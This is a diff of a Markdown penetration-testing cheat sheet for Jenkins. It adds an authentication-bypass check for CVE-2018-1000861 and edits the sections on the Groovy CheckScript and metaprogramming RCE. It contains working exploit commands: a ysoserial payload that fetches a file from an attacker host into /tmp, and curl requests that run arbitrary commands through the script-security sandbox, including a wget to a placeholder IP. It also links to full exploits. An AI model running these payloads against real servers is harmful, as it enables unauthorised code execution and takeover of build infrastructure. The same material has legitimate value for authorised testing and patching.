@@ -13,11 +13,23 @@ java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.s
 ```
 
 
+Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
+--------------------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2018-12-05/)
+
+Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).
+
+If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
+```bash
+curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
+```
+
+
 Metaprogramming RCE in Jenkins Plugins (CVE-2019-100300{0,1,2})
 ---------------------------------------------------------------
 [Jenkins Advisory](https://jenkins.io/security/advisory/2019-01-08)
 
-Original pre-auth RCE vulnerability details [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).
+Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).
 
 Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).
 
@@ -28,12 +40,12 @@ CheckScript RCE in Jenkins (CVE-2019-10030{29,30})
 
 Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
 ```bash
-curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
 ```
 
 Execute arbitraty bash commands:
 ```bash
-curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}'
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}'
 ```
 
 Alternative RCE/DACL bypass payload [here](https://gist.github.com/akhil-reni/e2116cc243af096ca3416168f49b3298) though be advised that this one will absolutely trash the whole security configuration!
